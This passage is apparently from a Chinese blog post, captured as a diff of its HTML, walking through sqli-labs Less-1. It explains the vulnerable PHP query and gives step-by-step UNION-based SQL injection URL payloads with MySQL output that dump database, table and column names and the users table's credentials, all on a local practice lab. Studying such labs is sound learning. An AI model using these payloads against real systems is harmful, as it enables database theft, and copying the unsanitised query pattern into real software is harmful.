+<td align="left">二进制形式的中等长度文本数据</td>
+</tr>
+<tr>
+<td align="left">MEDIUMTEXT</td>
+<td align="left">0-16 777 215 bytes</td>
+<td align="left">中等长度文本数据</td>
+</tr>
+<tr>
+<td align="left">LONGBLOB</td>
+<td align="left">0-4 294 967 295 bytes</td>
+<td align="left">二进制形式的极大文本数据</td>
+</tr>
+<tr>
+<td align="left">LONGTEXT</td>
+<td align="left">0-4 294 967 295 bytes</td>
+<td align="left">极大文本数据</td>
+</tr>
+</tbody></table>
+<h4 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h4><p>mysql常见的系统函数</p>
+<ul>
+<li>version()</li>
+<li>user()</li>
+<li>database()</li>
+<li>@@datadir</li>
+<li>@@version_compile_os</li>
+</ul>
+<h5 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h5><p>后端php语句</p>
+<p>做了下修改，便于更加直观的显示。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);</span><br><span class="line">print_r(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">print_r(<span class="variable">$row</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	print_r(mysql_error());</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出后端只输出了<code>username</code> <code>password</code> 这2个key=&gt;value，这是不可控的。</p>
+<p>mysql语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="string">&#x27;$id&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM users;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">13 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT * FROM users WHERE id=&#x27;1&#x27;;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT * FROM users WHERE id=&#x27;1&#x27; LIMIT 0,1;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>注意一下，由于只能控制<code>id</code>所以sql语句的前半句是不可控的。严格来说，后半句也不可控，但是我们可以将其注释掉，不可控的部分即：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>所以<strong>sql注入的核心就是在这个不可控的基础上来基于sql语法实现整个sql的功能</strong>。</p>
+<p>正常查询：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/less-1/?id=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311423236.png" alt="image-20210831103358768"></p>
+<p>尝试报错：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/less-1/?id=1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311423611.png" alt="image-20210831104149348"></p>
+<p>提醒limit前有<code>&#39;</code>没闭合，尝试闭合一下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM users WHERE id=&#x27;1&#x27;&#x27;&#x27;;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>看着会报错，但是没有，哈哈哈，有时候就觉得SQL这种结构化查询语言挺离谱的。</p>
+<p>尝试注释一下试试：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/less-1/?id=1&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311423827.png" alt="image-20210831110407694"></p>
+<p>可以看见闭合成功了，成功的用自己的<code>&#39;</code>取代的原有的<code>&#39;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1&#x27;-- &#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<p>并不是mysql的注释是<code>--+</code>而是<code>--空格</code>，看见<code>--+</code>变成了<code>--空格</code>这是因为url编码的关系。</p>
+<p><img src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311423882.png" alt="image-20210831110830240"></p>
+<p>在url中直接传递<code>空格</code>是不行的，必须写成<code>+</code>或者编码成<code>%20</code></p>
+<p><img src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311423938.png" alt="image-20210831111102046"></p>
+<p>在mysql中尝试执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1&#x27;-- &#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM users WHERE id=&#x27;1&#x27; -- &#x27; LIMIT 0,1;</span><br><span class="line">    -&gt; ^C</span><br></pre></td></tr></table></figure>
+
+<p>是无法成功的，因为<code>;</code>被注释掉了，必须在注释符之前再加一个<code>;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM users WHERE id=&#x27;1&#x27;; -- &#x27; LIMIT 0,1;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>至于php为什么可以，我猜测应该是php底层对mysql进行了一些适配，比如在之前的mysql语句就会自动加上<code>;</code>，目前不必深究。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM users WHERE id=&#x27;1&#x27; or id = &#x27;2&#x27;; -- &#x27; LIMIT 0,1;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311423020.png" alt="image-20210831114106535"></p>
+<p>可以看见mysql返回了2个数据，但是php只接收到了一个。</p>
+<p>这应该是由于PHP<code>mysql_fetch_array()</code>函数，这也是不可控的因素之一。</p>
+<p><img src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311423964.png" alt="image-20210831112319500"></p>
+<p>由于</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>的限制，导致我们只能查询的条件为id，接下来将使用mysql语法来突破这个限制。</p>
+<p>需要<code>union</code>关键字，用法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT expression1, expression2, ... expression_n</span><br><span class="line">FROM tables</span><br><span class="line">[WHERE conditions]</span><br><span class="line">UNION [ALL | DISTINCT]</span><br><span class="line">SELECT expression1, expression2, ... expression_n</span><br><span class="line">FROM tables</span><br><span class="line">[WHERE conditions];</span><br></pre></td></tr></table></figure>
+
+<p>简而言之，即：<code>union</code>之后可以再次进行<code>select</code>并且返回这2个<code>select</code>语句的查询内容。</p>
+<p><code>select</code><strong>简单用法</strong>如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1;</span><br><span class="line">+---+</span><br><span class="line">| 1 |</span><br><span class="line">+---+</span><br><span class="line">| 1 |</span><br><span class="line">+---+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select database();</span><br><span class="line">+------------+</span><br><span class="line">| database() |</span><br><span class="line">+------------+</span><br><span class="line">| security   |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1,2;</span><br><span class="line">+---+---+</span><br><span class="line">| 1 | 2 |</span><br><span class="line">+---+---+</span><br><span class="line">| 1 | 2 |</span><br><span class="line">+---+---+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select &#x27;a&#x27;,&#x27;b&#x27;;</span><br><span class="line">+---+---+</span><br><span class="line">| a | b |</span><br><span class="line">+---+---+</span><br><span class="line">| a | b |</span><br><span class="line">+---+---+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>但是<code>union</code>有一个要求那么就是返回的<code>column</code>的个数得对应上：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR 1222 (21000): The used SELECT statements have a different number of column</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1,2 union select 3;</span><br><span class="line">ERROR 1222 (21000): The used SELECT statements have a different number of column</span><br><span class="line">mysql&gt; select 1,2 union select 3,4;</span><br><span class="line">+---+---+</span><br><span class="line">| 1 | 2 |</span><br><span class="line">+---+---+</span><br><span class="line">| 1 | 2 |</span><br><span class="line">| 3 | 4 |</span><br><span class="line">+---+---+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>所以我们可以来逐步尝试猜测<code>id</code>对应的表对应的字段数：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/less-1/?id=1&#x27; union select 1,2; --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311424589.png" alt="image-20210831114453674"></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/less-1/?id=1&#x27; union select 1,2,3; --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311424076.png" alt="image-20210831114331100"></p>
+<p>即字段数为3。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM users WHERE id=&#x27;1&#x27; union select 1,2,3; -- &#x27; LIMIT 0,1;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">|  1 | 2        | 3        |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>显示正常，但是由于php函数的限制导致只能显示第一行的内容，所以我们需要选一个不存在的<code>id</code>来让第一行的内容消失。</p>
+<p>比如说<code>-1</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM users WHERE id=&#x27;-1&#x27; union select 1,2,3; -- &#x27; LIMIT 0,1;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | 2        | 3        |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311424083.png" alt="image-20210831114911064"></p>
+<p>可以发现2和3出现在了name和pass的位置，但是1去哪了？</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line"> 	<span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;</span>;</span><br><span class="line"> 	<span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"> 	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"> 	<span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"> 	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line"> 	&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于php源码的限制，只输出了<code>username</code>和<code>password</code>，所以我们只能在2和3的位置插入语句才能显示。</p>
+<p>尝试一下<code>version()</code>和<code>database()</code>函数</p>
+<p><img src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311424124.png" alt="image-20210831115320848"></p>
+<p>输出成功。</p>
+<p>现在知道了mysql的版本以及当前所在的数据库。接下来利用mysql5.0以上的特性，进行爆库。</p>
+<p><img src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311424939.png" alt="image-20210831120045832"></p>
+<p>即mysql自带的元数据库。</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/88342863">https://zhuanlan.zhihu.com/p/88342863</a></p>
+<p>爆库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM users WHERE id=&#x27;-1&#x27; union select 1,2,schema_name from information_schema.schemata; -- &#x27; LIMIT 0,1;</span><br><span class="line">+----+----------+--------------------+</span><br><span class="line">| id | username | password           |</span><br><span class="line">+----+----------+--------------------+</span><br><span class="line">|  1 | 2        | information_schema |</span><br><span class="line">|  1 | 2        | challenges         |</span><br><span class="line">|  1 | 2        | mysql              |</span><br><span class="line">|  1 | 2        | performance_schema |</span><br><span class="line">|  1 | 2        | security           |</span><br><span class="line">|  1 | 2        | sys                |</span><br><span class="line">+----+----------+--------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/less-1/?id=-1&#x27; union select 1,2,schema_name from information_schema.schemata; --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311424626.png" alt="image-20210831120905899"></p>
+<p>只出来了第一个库名，使用<code>group_concat()</code>函数，使其返回结果为一行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM users WHERE id=&#x27;-1&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata; -- &#x27; LIMIT 0,1;</span><br><span class="line">+----+----------+---------------------------------------------------------------------+</span><br><span class="line">| id | username | password                                                            |</span><br><span class="line">+----+----------+---------------------------------------------------------------------+</span><br><span class="line">|  1 | 2        | information_schema,challenges,mysql,performance_schema,security,sys |</span><br><span class="line">+----+----------+---------------------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311424507.png" alt="image-20210831121319587"></p>
+<p>那么我们为啥不在最开始就使用这个<code>group_concat()</code>函数呢？</p>
+<p>因为不可控，我们只能控制<code>id</code>的值，而<code>group_concat()</code>必须是使用在from之前的。</p>
+<p>而且<code>group_concat(*)</code>是不能的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;</span><br><span class="line">SELECT * FROM users WHERE id=&#x27;-1&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata; -- &#x27; LIMIT 0,1;</span><br></pre></td></tr></table></figure>
+
+<p>爆<code>sercurity</code>库的表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM users WHERE id=&#x27;-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = &#x27;security&#x27;; -- &#x27; LIMIT 0,1;</span><br><span class="line">+----+----------+-------------------------------+</span><br><span class="line">| id | username | password                      |</span><br><span class="line">+----+----------+-------------------------------+</span><br><span class="line">|  1 | 2        | emails,referers,uagents,users |</span><br><span class="line">+----+----------+-------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/less-1/?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = &#x27;security&#x27;; --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311424867.png" alt="image-20210831122058989"></p>
+<p>爆users表的字段。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM users WHERE id=&#x27;-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name = &#x27;users&#x27;; -- &#x27; LIMIT 0,1;</span><br><span class="line">+----+----------+-----------------------------------------------------------------+</span><br><span class="line">| id | username | password                                                        |</span><br><span class="line">+----+----------+-----------------------------------------------------------------+</span><br><span class="line">|  1 | 2        | USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password |</span><br><span class="line">+----+----------+-----------------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/less-1/?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name = &#x27;users&#x27;; --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311424739.png" alt="image-20210831122753800"></p>
+<p>爆数据：</p>
+<p>之前的操作都是为了得到表名和字段名，因为<code>select * from table</code>时<code>group_concat(*)</code>是不能的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM users WHERE id=&#x27;-1&#x27; union select 1,group_concat(username),group_concat(password) from users; -- &#x27; LIMIT 0,1;</span><br><span class="line">+----+---------------------------------------------------------------------------------------------+--------------------------------------------------------------------------------------------------+</span><br><span class="line">| id | username                                                                                    | password                                                                                         |</span><br><span class="line">+----+---------------------------------------------------------------------------------------------+--------------------------------------------------------------------------------------------------+</span><br><span class="line">|  1 | Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4 | Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4 |</span><br><span class="line">+----+---------------------------------------------------------------------------------------------+--------------------------------------------------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/less-1/?id=-1&#x27; union select 1,group_concat(username),group_concat(password) from users; --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/202108311424683.png" alt="image-20210831123103638"></p>
+<p>success!</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Sql%E6%B3%A8%E5%85%A5/" rel="tag"># Sql注入</a>
+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/08/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-Windows%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberos%E5%A7%94%E6%B4%BE%EF%BC%88%E4%BA%94%EF%BC%89/" rel="prev" title="内网安全-Windows域渗透-Kerberos委派（五）">
+      <i class="fa fa-chevron-left"></i> 内网安全-Windows域渗透-Kerberos委派（五）
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
